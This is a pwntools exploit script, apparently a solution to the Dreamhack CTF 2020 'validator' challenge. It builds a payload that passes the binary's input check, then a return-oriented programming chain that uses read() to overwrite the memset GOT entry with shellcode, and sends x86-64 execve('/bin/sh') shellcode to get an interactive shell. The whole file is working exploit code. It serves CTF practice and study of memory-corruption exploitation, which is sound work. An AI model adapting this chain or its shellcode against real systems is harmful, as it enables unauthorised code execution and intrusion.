from pwn import *
 # referance : https://lactea.kr/entry/DreamhackCTF-2020-validator-write-up
 #https://koharinn.tistory.com/81

#p = remote("host1.dreamhack.games", 19899)
context.log_level ='debug'
p = process("./validator_dist")
e = ELF("./validator_dist", checksec=False)
 
payload = "DREAMHACK!"
 
lst = []
for i in range(118,0,-1):
    lst.append(i)
payload += bytearray(lst)
payload += p64(0)
# read(0, memset_got, len(shellcode))
payload += p64(0x4006f3) # pop rdi ret 
payload += p64(0) # 1st argument
payload += p64(0x4006f1) # pop rsi ; pop r15 ; ret
payload += p64(e.got['memset']) #2nd argument
payload += p64(0)#dummy for pop r15
payload += p64(0x40057b)#pop rdx ; ret
payload += p64(0x50)#length of shellcoded
payload += p64(0x400470)#read_plt
payload += p64(0x400460)#memset_plt
p.sendline(str(payload))
p.sendline("\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05")
p.interactive()

